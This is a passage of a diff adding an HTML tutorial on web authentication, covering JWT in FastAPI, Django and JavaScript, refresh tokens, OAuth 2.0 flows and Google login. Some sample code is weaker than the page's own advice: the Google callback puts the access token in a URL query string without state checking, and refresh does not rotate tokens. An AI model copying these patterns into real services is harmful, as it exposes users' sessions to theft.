+    token: str = <span class="f">Depends</span>(oauth2_scheme),
+    db: Session = <span class="f">Depends</span>(get_db)
+):
+    payload = <span class="f">decode_token</span>(token)
+    user_id = payload.<span class="f">get</span>(<span class="s">"sub"</span>)
+    <span class="k">if not</span> user_id:
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">401</span>, detail=<span class="s">"Invalid token"</span>)
+    user = db.<span class="f">query</span>(User).<span class="f">filter</span>(User.id == user_id).<span class="f">first</span>()
+    <span class="k">if not</span> user:
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">401</span>, detail=<span class="s">"User not found"</span>)
+    <span class="k">return</span> user
+
+<span class="c"># Role-based dependency factory</span>
+<span class="k">def</span> <span class="f">require_role</span>(*roles: str):
+    <span class="k">async def</span> <span class="f">check_role</span>(current_user = <span class="f">Depends</span>(get_current_user)):
+        <span class="k">if</span> current_user.role <span class="k">not in</span> roles:
+            <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">403</span>, detail=<span class="s">"Insufficient permissions"</span>)
+        <span class="k">return</span> current_user
+    <span class="k">return</span> check_role
+
+<span class="c"># Usage: @app.get("/admin") def admin(user=Depends(require_role("admin", "superuser")))</span></div>
+
+  <div class="clabel">auth/routes.py — Login, Refresh, Logout endpoints</div>
+  <div class="code"><span class="k">from</span> fastapi <span class="k">import</span> APIRouter, Depends, HTTPException, Response, Cookie
+<span class="k">from</span> pydantic <span class="k">import</span> BaseModel
+<span class="k">from</span> .utils <span class="k">import</span> verify_password, create_access_token, create_refresh_token, decode_token
+
+router = <span class="f">APIRouter</span>(prefix=<span class="s">"/api/auth"</span>)
+
+<span class="k">class</span> <span class="f">LoginRequest</span>(BaseModel):
+    username: str
+    password: str
+
+<span class="f">@router.post</span>(<span class="s">"/login"</span>)
+<span class="k">async def</span> <span class="f">login</span>(req: LoginRequest, response: Response, db: Session = <span class="f">Depends</span>(get_db)):
+    user = db.<span class="f">query</span>(User).<span class="f">filter</span>(User.username == req.username).<span class="f">first</span>()
+    <span class="k">if not</span> user <span class="k">or not</span> <span class="f">verify_password</span>(req.password, user.hashed_password):
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">401</span>, detail=<span class="s">"Invalid credentials"</span>)
+
+    access_token = <span class="f">create_access_token</span>({<span class="s">"sub"</span>: str(user.id), <span class="s">"role"</span>: user.role})
+    refresh_token = <span class="f">create_refresh_token</span>({<span class="s">"sub"</span>: str(user.id)})
+
+    <span class="c"># Store refresh token in DB</span>
+    db_refresh = RefreshToken(user_id=user.id, token=refresh_token)
+    db.<span class="f">add</span>(db_refresh); db.<span class="f">commit</span>()
+
+    <span class="c"># Refresh token in HttpOnly cookie (secure, no JS access)</span>
+    response.<span class="f">set_cookie</span>(<span class="s">"refresh_token"</span>, refresh_token,
+        httponly=<span class="n">True</span>, secure=<span class="n">True</span>, samesite=<span class="s">"lax"</span>, max_age=<span class="n">604800</span>)
+
+    <span class="k">return</span> {<span class="s">"access_token"</span>: access_token, <span class="s">"token_type"</span>: <span class="s">"bearer"</span>}
+
+<span class="f">@router.post</span>(<span class="s">"/refresh"</span>)
+<span class="k">async def</span> <span class="f">refresh</span>(refresh_token: str = <span class="f">Cookie</span>(default=<span class="n">None</span>), db = <span class="f">Depends</span>(get_db)):
+    <span class="k">if not</span> refresh_token:
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">401</span>, detail=<span class="s">"No refresh token"</span>)
+    payload = <span class="f">decode_token</span>(refresh_token)
+    <span class="c"># Verify it exists in DB (not revoked)</span>
+    db_token = db.<span class="f">query</span>(RefreshToken).<span class="f">filter</span>(RefreshToken.token == refresh_token).<span class="f">first</span>()
+    <span class="k">if not</span> db_token:
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">401</span>, detail=<span class="s">"Refresh token revoked"</span>)
+    new_access = <span class="f">create_access_token</span>({<span class="s">"sub"</span>: payload[<span class="s">"sub"</span>]})
+    <span class="k">return</span> {<span class="s">"access_token"</span>: new_access, <span class="s">"token_type"</span>: <span class="s">"bearer"</span>}
+
+<span class="f">@router.post</span>(<span class="s">"/logout"</span>)
+<span class="k">async def</span> <span class="f">logout</span>(response: Response, refresh_token: str = <span class="f">Cookie</span>(default=<span class="n">None</span>), db = <span class="f">Depends</span>(get_db)):
+    <span class="k">if</span> refresh_token:
+        db.<span class="f">query</span>(RefreshToken).<span class="f">filter</span>(RefreshToken.token == refresh_token).<span class="f">delete</span>()
+        db.<span class="f">commit</span>()
+    response.<span class="f">delete_cookie</span>(<span class="s">"refresh_token"</span>)
+    <span class="k">return</span> {<span class="s">"message"</span>: <span class="s">"Logged out"</span>}</div>
+</section>
+
+<!-- ═══ JWT DJANGO ═══ -->
+<section id="sec-jwt-django" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 12 · Build It</div>
+    <h1 class="htitle">JWT in <span>Django</span></h1>
+    <p class="hsub">Using djangorestframework-simplejwt — the production standard for JWT in Django REST Framework.</p>
+  </div>
+
+  <div class="clabel">Install</div>
+  <div class="code">pip install djangorestframework djangorestframework-simplejwt</div>
+
+  <div class="clabel">settings.py — DRF + SimpleJWT config</div>
+  <div class="code">INSTALLED_APPS = [<span class="s">'rest_framework'</span>, ...]
+
+REST_FRAMEWORK = {
+    <span class="s">'DEFAULT_AUTHENTICATION_CLASSES'</span>: (
+        <span class="s">'rest_framework_simplejwt.authentication.JWTAuthentication'</span>,
+    ),
+    <span class="s">'DEFAULT_PERMISSION_CLASSES'</span>: (
+        <span class="s">'rest_framework.permissions.IsAuthenticated'</span>,
+    ),
+}
+
+<span class="k">from</span> datetime <span class="k">import</span> timedelta
+SIMPLE_JWT = {
+    <span class="s">'ACCESS_TOKEN_LIFETIME'</span>: timedelta(minutes=<span class="n">15</span>),
+    <span class="s">'REFRESH_TOKEN_LIFETIME'</span>: timedelta(days=<span class="n">7</span>),
+    <span class="s">'ROTATE_REFRESH_TOKENS'</span>: <span class="n">True</span>,         <span class="c"># New refresh token on each use</span>
+    <span class="s">'BLACKLIST_AFTER_ROTATION'</span>: <span class="n">True</span>,       <span class="c"># Old refresh tokens invalidated</span>
+    <span class="s">'ALGORITHM'</span>: <span class="s">'HS256'</span>,
+    <span class="s">'SIGNING_KEY'</span>: SECRET_KEY,
+    <span class="s">'AUTH_HEADER_TYPES'</span>: (<span class="s">'Bearer'</span>,),
+    <span class="s">'USER_ID_FIELD'</span>: <span class="s">'id'</span>,
+    <span class="s">'USER_ID_CLAIM'</span>: <span class="s">'user_id'</span>,
+}</div>
+
+  <div class="clabel">urls.py — JWT endpoints</div>
+  <div class="code"><span class="k">from</span> rest_framework_simplejwt.views <span class="k">import</span> TokenObtainPairView, TokenRefreshView, TokenVerifyView
+
+urlpatterns = [
+    path(<span class="s">'api/auth/login/'</span>, TokenObtainPairView.as_view(), name=<span class="s">'token_obtain'</span>),
+    path(<span class="s">'api/auth/refresh/'</span>, TokenRefreshView.as_view(), name=<span class="s">'token_refresh'</span>),
+    path(<span class="s">'api/auth/verify/'</span>, TokenVerifyView.as_view(), name=<span class="s">'token_verify'</span>),
+]</div>
+
+  <div class="clabel">views.py — Protected Django REST API view</div>
+  <div class="code"><span class="k">from</span> rest_framework.decorators <span class="k">import</span> api_view, permission_classes
+<span class="k">from</span> rest_framework.permissions <span class="k">import</span> IsAuthenticated, IsAdminUser
+<span class="k">from</span> rest_framework.response <span class="k">import</span> Response
+
+<span class="f">@api_view</span>([<span class="s">'GET'</span>])
+<span class="f">@permission_classes</span>([IsAuthenticated])
+<span class="k">def</span> <span class="f">user_profile</span>(request):
+    <span class="k">return</span> <span class="f">Response</span>({
+        <span class="s">"id"</span>: request.user.id,
+        <span class="s">"username"</span>: request.user.username,
+        <span class="s">"email"</span>: request.user.email,
+    })
+
+<span class="f">@api_view</span>([<span class="s">'GET'</span>])
+<span class="f">@permission_classes</span>([IsAdminUser])   <span class="c"># Only admin users</span>
+<span class="k">def</span> <span class="f">admin_only</span>(request):
+    <span class="k">return</span> <span class="f">Response</span>({<span class="s">"message"</span>: <span class="s">"admin area"</span>})</div>
+
+  <div class="clabel">Custom claims — add role to JWT payload</div>
+  <div class="code"><span class="k">from</span> rest_framework_simplejwt.serializers <span class="k">import</span> TokenObtainPairSerializer
+<span class="k">from</span> rest_framework_simplejwt.views <span class="k">import</span> TokenObtainPairView
+
+<span class="k">class</span> <span class="f">CustomTokenSerializer</span>(TokenObtainPairSerializer):
+    <span class="f">@classmethod</span>
+    <span class="k">def</span> <span class="f">get_token</span>(cls, user):
+        token = <span class="f">super</span>().<span class="f">get_token</span>(user)
+        <span class="c"># Add custom claims to JWT payload</span>
+        token[<span class="s">'username'</span>] = user.username
+        token[<span class="s">'role'</span>] = user.profile.role  <span class="c"># your custom field</span>
+        token[<span class="s">'email'</span>] = user.email
+        <span class="k">return</span> token
+
+<span class="k">class</span> <span class="f">CustomLoginView</span>(TokenObtainPairView):
+    serializer_class = CustomTokenSerializer</div>
+</section>
+
+<!-- ═══ JWT FRONTEND ═══ -->
+<section id="sec-jwt-frontend" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 13 · Build It</div>
+    <h1 class="htitle">JWT in <span>JavaScript Frontend</span></h1>
+    <p class="hsub">How to handle JWT in a plain HTML/CSS/JS frontend — login, storing tokens, attaching to requests, auto-refresh, and logout.</p>
+  </div>
+
+  <div class="clabel">auth.js — Complete auth module for your frontend</div>
+  <div class="code"><span class="c">// ─── Auth state (in-memory — safest option) ───────────────────────────────</span>
+<span class="k">let</span> accessToken = <span class="n">null</span>;  <span class="c">// Never store in localStorage — XSS risk</span>
+
+<span class="c">// ─── Login ────────────────────────────────────────────────────────────────</span>
+<span class="k">async function</span> <span class="f">login</span>(username, password) {
+  <span class="k">const</span> res = <span class="k">await</span> <span class="f">fetch</span>(<span class="s">'/api/auth/login'</span>, {
+    method: <span class="s">'POST'</span>,
+    headers: { <span class="s">'Content-Type'</span>: <span class="s">'application/json'</span> },
+    body: <span class="f">JSON.stringify</span>({ username, password }),
+    credentials: <span class="s">'include'</span>   <span class="c">// Important: sends/receives HttpOnly cookies</span>
+  });
+  <span class="k">if</span> (!res.ok) <span class="k">throw new</span> <span class="f">Error</span>(<span class="s">'Login failed'</span>);
+  <span class="k">const</span> data = <span class="k">await</span> res.<span class="f">json</span>();
+  accessToken = data.access_token;  <span class="c">// Store in memory only</span>
+  <span class="f">scheduleRefresh</span>();
+  <span class="k">return</span> data;
+}
+
+<span class="c">// ─── Authenticated fetch wrapper ──────────────────────────────────────────</span>
+<span class="k">async function</span> <span class="f">authFetch</span>(url, options = {}) {
+  <span class="k">if</span> (!accessToken) <span class="k">await</span> <span class="f">tryRefresh</span>();  <span class="c">// Try to refresh on page load</span>
+  <span class="k">const</span> res = <span class="k">await</span> <span class="f">fetch</span>(url, {
+    ...options,
+    headers: {
+      ...options.headers,
+      <span class="s">'Authorization'</span>: <span class="s">`Bearer ${accessToken}`</span>,
+      <span class="s">'Content-Type'</span>: <span class="s">'application/json'</span>
+    },
+    credentials: <span class="s">'include'</span>
+  });
+  <span class="k">if</span> (res.status === <span class="n">401</span>) {
+    <span class="c">// Access token expired — try to refresh silently</span>
+    <span class="k">const</span> refreshed = <span class="k">await</span> <span class="f">tryRefresh</span>();
+    <span class="k">if</span> (refreshed) <span class="k">return</span> <span class="f">authFetch</span>(url, options);  <span class="c">// Retry</span>
+    <span class="f">redirectToLogin</span>();  <span class="c">// Refresh failed — send to login</span>
+  }
+  <span class="k">return</span> res;
+}
+
+<span class="c">// ─── Silent refresh ───────────────────────────────────────────────────────</span>
+<span class="k">async function</span> <span class="f">tryRefresh</span>() {
+  <span class="k">try</span> {
+    <span class="k">const</span> res = <span class="k">await</span> <span class="f">fetch</span>(<span class="s">'/api/auth/refresh'</span>, {
+      method: <span class="s">'POST'</span>,
+      credentials: <span class="s">'include'</span>  <span class="c">// Sends HttpOnly refresh_token cookie</span>
+    });
+    <span class="k">if</span> (!res.ok) <span class="k">return false</span>;
+    <span class="k">const</span> data = <span class="k">await</span> res.<span class="f">json</span>();
+    accessToken = data.access_token;
+    <span class="f">scheduleRefresh</span>();
+    <span class="k">return true</span>;
+  } <span class="k">catch</span> { <span class="k">return false</span>; }
+}
+
+<span class="c">// ─── Auto-refresh before expiry ───────────────────────────────────────────</span>
+<span class="k">function</span> <span class="f">scheduleRefresh</span>() {
+  <span class="f">setTimeout</span>(<span class="f">tryRefresh</span>, <span class="n">14</span> * <span class="n">60</span> * <span class="n">1000</span>);  <span class="c">// Refresh at 14 min (token expires 15 min)</span>
+}
+
+<span class="c">// ─── Logout ───────────────────────────────────────────────────────────────</span>
+<span class="k">async function</span> <span class="f">logout</span>() {
+  <span class="k">await</span> <span class="f">fetch</span>(<span class="s">'/api/auth/logout'</span>, { method: <span class="s">'POST'</span>, credentials: <span class="s">'include'</span> });
+  accessToken = <span class="n">null</span>;  <span class="c">// Clear in-memory token</span>
+  <span class="f">redirectToLogin</span>();
+}</div>
+
+  <div class="callout q5"><strong>Never use localStorage for access tokens.</strong> localStorage is accessible by any JavaScript on the page. One XSS attack and all your users' tokens are stolen. Store access tokens only in memory (a JS variable). Store refresh tokens in HttpOnly cookies (inaccessible to JS).</div>
+</section>
+
+<!-- ═══ REFRESH TOKENS ═══ -->
+<section id="sec-refresh-tokens" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 14 · JWT Deep Dive</div>
+    <h1 class="htitle">Access &amp; <span>Refresh Tokens</span></h1>
+    <p class="hsub">The dual-token pattern solves JWT's biggest weakness — inability to revoke — while maintaining stateless scalability.</p>
+  </div>
+  <div class="g2">
+    <div class="card ca1">
+      <div class="ct">Access Token</div>
+      <div class="cb"><strong>Lifetime:</strong> 5–15 minutes<br><strong>Stored:</strong> JavaScript memory (never localStorage)<br><strong>Sent via:</strong> Authorization header<br><strong>Stateless:</strong> Yes — no DB check needed<br><strong>Purpose:</strong> Short-lived proof to access API endpoints</div>
+    </div>
+    <div class="card ca2">
+      <div class="ct">Refresh Token</div>
+      <div class="cb"><strong>Lifetime:</strong> 7–30 days<br><strong>Stored:</strong> HttpOnly Secure cookie<br><strong>Sent via:</strong> Cookie (automatic)<br><strong>Stateless:</strong> No — validated against DB<br><strong>Purpose:</strong> Long-lived credential to get new access tokens</div>
+    </div>
+  </div>
+  <div class="callout q3"><strong>Token rotation:</strong> When a refresh token is used, immediately replace it with a new one and invalidate the old one. If an attacker steals a refresh token and uses it, the legitimate user's next refresh attempt will fail (old token already used), alerting you to a token theft.</div>
+
+  <h2>Refresh token DB model (FastAPI/SQLAlchemy)</h2>
+  <div class="clabel">models.py</div>
+  <div class="code"><span class="k">from</span> sqlalchemy <span class="k">import</span> Column, String, Integer, DateTime, Boolean, ForeignKey
+<span class="k">from</span> datetime <span class="k">import</span> datetime, timedelta
+
+<span class="k">class</span> <span class="f">RefreshToken</span>(Base):
+    __tablename__ = <span class="s">"refresh_tokens"</span>
+    id = <span class="f">Column</span>(<span class="f">Integer</span>, primary_key=<span class="n">True</span>)
+    token = <span class="f">Column</span>(<span class="f">String</span>, unique=<span class="n">True</span>, index=<span class="n">True</span>)   <span class="c"># Store hashed in production</span>
+    user_id = <span class="f">Column</span>(<span class="f">Integer</span>, <span class="f">ForeignKey</span>(<span class="s">"users.id"</span>))
+    created_at = <span class="f">Column</span>(<span class="f">DateTime</span>, default=datetime.utcnow)
+    expires_at = <span class="f">Column</span>(<span class="f">DateTime</span>, default=<span class="k">lambda</span>: datetime.utcnow() + timedelta(days=<span class="n">7</span>))
+    is_revoked = <span class="f">Column</span>(<span class="f">Boolean</span>, default=<span class="n">False</span>)
+    device_info = <span class="f">Column</span>(<span class="f">String</span>, nullable=<span class="n">True</span>)  <span class="c"># "Chrome on Windows" etc.</span></div>
+</section>
+
+<!-- ═══ OAUTH INTRO ═══ -->
+<section id="sec-oauth-intro" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 15 · OAuth 2.0</div>
+    <h1 class="htitle">What is <span>OAuth 2.0</span>?</h1>
+    <p class="hsub">OAuth 2.0 is an authorization framework that enables a third-party application to obtain limited access to a service on behalf of a user — without ever seeing the user's password. It's the protocol behind "Login with Google," "Connect with GitHub," etc.</p>
+  </div>
+
+  <h2>The core OAuth problem it solves</h2>
+  <div class="callout q4"><strong>Before OAuth:</strong> To let a third-party app access your Google Drive, you'd have to give it your Google password. If the app was hacked, your Google password was compromised, and the attacker had full access to your account. OAuth solves this by using short-lived, scoped tokens instead of passwords.</div>
+
+  <div class="g3">
+    <div class="mini"><div class="mt" style="color:var(--a5)">Resource Owner</div><div class="mb">The user who owns the data. You, logging into an app with your Google account.</div></div>
+    <div class="mini"><div class="mt" style="color:var(--a1)">Client</div><div class="mb">The application that wants access. Your app that users log into via Google.</div></div>
+    <div class="mini"><div class="mt" style="color:var(--a3)">Authorization Server</div><div class="mb">The server that authenticates users and issues tokens. Google's auth server at accounts.google.com.</div></div>
+    <div class="mini"><div class="mt" style="color:var(--a2)">Resource Server</div><div class="mb">The API that holds the protected data. Google's API that returns user profile info.</div></div>
+    <div class="mini"><div class="mt" style="color:var(--a4)">Access Token</div><div class="mb">Short-lived credential (usually a JWT) that proves the client is authorized to access specific resources.</div></div>
+    <div class="mini"><div class="mt" style="color:var(--a7)">Scope</div><div class="mb">What the token is allowed to do: <code>read:email profile openid</code>. Least privilege principle.</div></div>
+  </div>
+</section>
+
+<!-- ═══ OAUTH FLOWS ═══ -->
+<section id="sec-oauth-flows" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 16 · OAuth 2.0</div>
+    <h1 class="htitle">OAuth 2.0 <span>Grant Types</span></h1>
+    <p class="hsub">OAuth 2.0 defines multiple "flows" (grant types) for different use cases. Choosing the right one matters for security.</p>
+  </div>
+
+  <div class="tw"><table>
+    <thead><tr><th>Grant Type</th><th>Use case</th><th>Security</th><th>Has refresh token?</th></tr></thead>
+    <tbody>
+      <tr><td>Authorization Code + PKCE</td><td>Web apps, mobile apps, SPAs</td><td><span class="pill p3">Most Secure</span></td><td><span class="pill p3">Yes</span></td></tr>
+      <tr><td>Authorization Code</td><td>Server-side web apps (traditional)</td><td><span class="pill p3">Secure</span></td><td><span class="pill p3">Yes</span></td></tr>
+      <tr><td>Client Credentials</td><td>Machine-to-machine (no user)</td><td><span class="pill p3">Secure</span></td><td><span class="pill p5">No</span></td></tr>
+      <tr><td>Device Code</td><td>TVs, CLIs, devices without browser</td><td><span class="pill p3">Secure</span></td><td><span class="pill p3">Yes</span></td></tr>
+      <tr><td>Resource Owner Password</td><td>Trusted first-party apps only</td><td><span class="pill p5">Risky — avoid</span></td><td><span class="pill p3">Yes</span></td></tr>
+      <tr><td>Implicit</td><td>DEPRECATED — old SPAs</td><td><span class="pill p5">Insecure — never use</span></td><td><span class="pill p5">No</span></td></tr>
+    </tbody>
+  </table></div>
+
+  <h2>Authorization Code + PKCE flow (the one you should use)</h2>
+  <div class="steps">
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(0,212,255,.2);color:var(--a1)">1</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Client generates code_verifier and code_challenge</div><div class="sbody">Frontend generates a random <code>code_verifier</code> string. Creates <code>code_challenge = base64url(sha256(code_verifier))</code>. PKCE prevents interception attacks.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(16,185,129,.2);color:var(--a3)">2</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Redirect to Authorization Server</div><div class="sbody"><code>https://accounts.google.com/o/oauth2/auth?client_id=...&redirect_uri=...&scope=email profile&response_type=code&code_challenge=...&code_challenge_method=S256</code></div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(245,158,11,.2);color:var(--a4)">3</div><div class="sv2"></div></div><div class="sc"><div class="stitle">User logs in and consents on Google's page</div><div class="sbody">Google shows the login page. User enters their Google credentials (your app never sees them). User approves the requested scopes.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(124,58,237,.2);color:var(--a2)">4</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Authorization code returned to redirect_uri</div><div class="sbody">Google redirects back: <code>https://yourapp.com/callback?code=4/P7q7W91&state=xyz</code>. The <code>code</code> is single-use, expires in ~10 minutes, and is useless without the code_verifier.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(16,185,129,.2);color:var(--a3)">5</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Backend exchanges code for tokens</div><div class="sbody">Your FastAPI backend POSTs the code + code_verifier to Google's token endpoint. Google verifies the challenge, returns access_token + id_token.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(6,182,212,.2);color:var(--a6)">6</div></div><div class="sc"><div class="stitle">Your backend issues its own JWT to the user</div><div class="sbody">Extract user info from Google's id_token. Create or update user in your DB. Issue your own JWT. Google's token stays on your server — frontend only gets your JWT.</div></div></div>
+  </div>
+</section>
+
+<!-- ═══ OAUTH FASTAPI ═══ -->
+<section id="sec-oauth-fastapi" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 17 · Build It</div>
+    <h1 class="htitle">OAuth in <span>FastAPI</span></h1>
+    <p class="hsub">Implementing the OAuth2 password flow (for your own auth server) and consuming external OAuth (Google) in FastAPI.</p>
+  </div>
+
+  <div class="clabel">OAuth2 Password Flow in FastAPI (for your own users)</div>
+  <div class="code"><span class="k">from</span> fastapi <span class="k">import</span> FastAPI, Depends
+<span class="k">from</span> fastapi.security <span class="k">import</span> OAuth2PasswordBearer, OAuth2PasswordRequestForm
+
+app = <span class="f">FastAPI</span>()
+oauth2_scheme = <span class="f">OAuth2PasswordBearer</span>(tokenUrl=<span class="s">"/token"</span>)
+
+<span class="f">@app.post</span>(<span class="s">"/token"</span>)
+<span class="k">async def</span> <span class="f">login</span>(form_data: OAuth2PasswordRequestForm = <span class="f">Depends</span>()):
+    <span class="c"># form_data.username, form_data.password</span>
+    user = <span class="f">authenticate_user</span>(form_data.username, form_data.password)
+    <span class="k">if not</span> user:
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">400</span>, detail=<span class="s">"Incorrect username or password"</span>)
+    access_token = <span class="f">create_access_token</span>({<span class="s">"sub"</span>: user.username})
+    <span class="k">return</span> {<span class="s">"access_token"</span>: access_token, <span class="s">"token_type"</span>: <span class="s">"bearer"</span>}</div>
+
+  <div class="clabel">Google OAuth — FastAPI callback handler</div>
+  <div class="code"><span class="k">import</span> httpx
+<span class="k">from</span> fastapi <span class="k">import</span> APIRouter
+
+GOOGLE_CLIENT_ID = <span class="s">"your-client-id"</span>
+GOOGLE_CLIENT_SECRET = <span class="s">"your-secret"</span>
+GOOGLE_REDIRECT_URI = <span class="s">"https://yourapp.com/auth/google/callback"</span>
+
+<span class="f">@router.get</span>(<span class="s">"/auth/google"</span>)
+<span class="k">async def</span> <span class="f">google_login</span>():
+    params = {
+        <span class="s">"client_id"</span>: GOOGLE_CLIENT_ID,
+        <span class="s">"redirect_uri"</span>: GOOGLE_REDIRECT_URI,
+        <span class="s">"response_type"</span>: <span class="s">"code"</span>,
+        <span class="s">"scope"</span>: <span class="s">"openid email profile"</span>,
+    }
+    url = <span class="s">"https://accounts.google.com/o/oauth2/auth?"</span> + <span class="f">urlencode</span>(params)
+    <span class="k">return</span> <span class="f">RedirectResponse</span>(url)
+
+<span class="f">@router.get</span>(<span class="s">"/auth/google/callback"</span>)
+<span class="k">async def</span> <span class="f">google_callback</span>(code: str, db = <span class="f">Depends</span>(get_db)):
+    <span class="c"># Step 1: Exchange code for tokens</span>
+    <span class="k">async with</span> httpx.<span class="f">AsyncClient</span>() <span class="k">as</span> client:
+        token_res = <span class="k">await</span> client.<span class="f">post</span>(<span class="s">"https://oauth2.googleapis.com/token"</span>, data={
+            <span class="s">"code"</span>: code,
+            <span class="s">"client_id"</span>: GOOGLE_CLIENT_ID,
+            <span class="s">"client_secret"</span>: GOOGLE_CLIENT_SECRET,
+            <span class="s">"redirect_uri"</span>: GOOGLE_REDIRECT_URI,
+            <span class="s">"grant_type"</span>: <span class="s">"authorization_code"</span>,
+        })
+        tokens = token_res.<span class="f">json</span>()
+
+    <span class="c"># Step 2: Get user info from Google</span>
+    <span class="k">async with</span> httpx.<span class="f">AsyncClient</span>() <span class="k">as</span> client:
+        userinfo = (<span class="k">await</span> client.<span class="f">get</span>(
+            <span class="s">"https://www.googleapis.com/oauth2/v3/userinfo"</span>,
+            headers={<span class="s">"Authorization"</span>: <span class="s">f"Bearer {tokens['access_token']}"</span>}
+        )).<span class="f">json</span>()
+
+    <span class="c"># Step 3: Find or create user in your DB</span>
+    user = db.<span class="f">query</span>(User).<span class="f">filter</span>(User.email == userinfo[<span class="s">"email"</span>]).<span class="f">first</span>()
+    <span class="k">if not</span> user:
+        user = <span class="f">User</span>(email=userinfo[<span class="s">"email"</span>], name=userinfo[<span class="s">"name"</span>], oauth_provider=<span class="s">"google"</span>)
+        db.<span class="f">add</span>(user); db.<span class="f">commit</span>()
+
+    <span class="c"># Step 4: Issue YOUR OWN JWT to the frontend</span>
+    access_token = <span class="f">create_access_token</span>({<span class="s">"sub"</span>: str(user.id), <span class="s">"role"</span>: user.role})
+    <span class="k">return</span> <span class="f">RedirectResponse</span>(<span class="s">f"/dashboard?token={access_token}"</span>)</div>
+</section>
+
+<!-- ═══ SOCIAL LOGIN ═══ -->
+<section id="sec-social-login" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 18 · Build It</div>
+    <h1 class="htitle">Social Login <span>(Google)</span></h1>
+    <p class="hsub">Implementing "Login with Google" end-to-end — frontend button, backend callback, and user creation.</p>
+  </div>
+
+  <div class="clabel">frontend — login.html</div>
+  <div class="code"><span class="c">&lt;!-- Google Sign-In button --&gt;</span>
+&lt;button onclick=<span class="s">"loginWithGoogle()"</span> class=<span class="s">"google-btn"</span>&gt;
+  &lt;img src=<span class="s">"google-icon.svg"</span>&gt; Sign in with Google
+&lt;/button&gt;
+
+&lt;script&gt;
+<span class="k">function</span> <span class="f">loginWithGoogle</span>() {
+  <span class="c">// Redirect to your backend which redirects to Google</span>
+  window.location.href = <span class="s">'/auth/google'</span>;
+}
+
+<span class="c">// After callback, token arrives as URL param or cookie</span>
+<span class="k">const</span> urlParams = <span class="k">new</span> <span class="f">URLSearchParams</span>(window.location.search);
+<span class="k">const</span> token = urlParams.<span class="f">get</span>(<span class="s">'token'</span>);
+<span class="k">if</span> (token) {
+  accessToken = token;  <span class="c">// Store in memory</span>
+  window.history.<span class="f">replaceState</span>({}, <span class="s">''</span>, <span class="s">'/dashboard'</span>);  <span class="c">// Clean URL</span>
+}
+&lt;/script&gt;</div>
+
+  <div class="clabel">authlib — cleaner OAuth with Authlib library</div>
+  <div class="code">pip install authlib httpx
+
+<span class="c"># main.py</span>
+<span class="k">from</span> authlib.integrations.starlette_client <span class="k">import</span> OAuth
+<span class="k">from</span> starlette.config <span class="k">import</span> Config
+
+config = <span class="f">Config</span>(<span class="s">'.env'</span>)
+oauth = <span class="f">OAuth</span>(config)
+oauth.<span class="f">register</span>(
+    name=<span class="s">'google'</span>,
+    client_id=config(<span class="s">'GOOGLE_CLIENT_ID'</span>),
+    client_secret=config(<span class="s">'GOOGLE_CLIENT_SECRET'</span>),
+    server_metadata_url=<span class="s">'https://accounts.google.com/.well-known/openid-configuration'</span>,
+    client_kwargs={<span class="s">'scope'</span>: <span class="s">'openid email profile'</span>}
+)
+
+<span class="f">@app.get</span>(<span class="s">'/auth/google'</span>)
+<span class="k">async def</span> <span class="f">google_login</span>(request: Request):
+    redirect_uri = <span class="s">'https://yourapp.com/auth/google/callback'</span>
+    <span class="k">return await</span> oauth.google.<span class="f">authorize_redirect</span>(request, redirect_uri)
+
+<span class="f">@app.get</span>(<span class="s">'/auth/google/callback'</span>)
+<span class="k">async def</span> <span class="f">google_callback</span>(request: Request):
+    token = <span class="k">await</span> oauth.google.<span class="f">authorize_access_token</span>(request)
+    user_info = token[<span class="s">'userinfo'</span>]  <span class="c"># email, name, picture, sub</span>
+    <span class="c"># Create/update user and issue your JWT</span>
+    ...</div>
+</section>
+
+<!-- ═══ OIDC ═══ -->
+<section id="sec-oidc" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 19 · OpenID Connect</div>
+    <h1 class="htitle">OpenID <span>Connect</span> (OIDC)</h1>
+    <p class="hsub">OpenID Connect is an authentication layer built on top of OAuth 2.0. OAuth handles authorization (what you can do), OIDC adds identity (who you are). Every "Login with Google/GitHub/Microsoft" uses OIDC.</p>
+  </div>
+
+  <div class="callout q1"><strong>OAuth 2.0 vs OIDC in one sentence:</strong> OAuth 2.0 says "this app can access your files." OpenID Connect says "this is definitely Alice, here's her profile." OIDC uses OAuth's transport but adds a standardized way to convey user identity.</div>
+
+  <h2>The ID Token</h2>
+  <p>OIDC adds an <strong>ID Token</strong> (a JWT) to OAuth's access token. The ID Token contains standardized claims about the user's identity:</p>
+  <div class="code">{
+  <span class="s">"iss"</span>: <span class="s">"https://accounts.google.com"</span>,    <span class="c">// Issuer</span>
+  <span class="s">"sub"</span>: <span class="s">"1234567890"</span>,                    <span class="c">// User's unique ID at Google</span>
+  <span class="s">"aud"</span>: <span class="s">"your-client-id"</span>,               <span class="c">// Your app</span>
+  <span class="s">"exp"</span>: <span class="n">1700000000</span>,
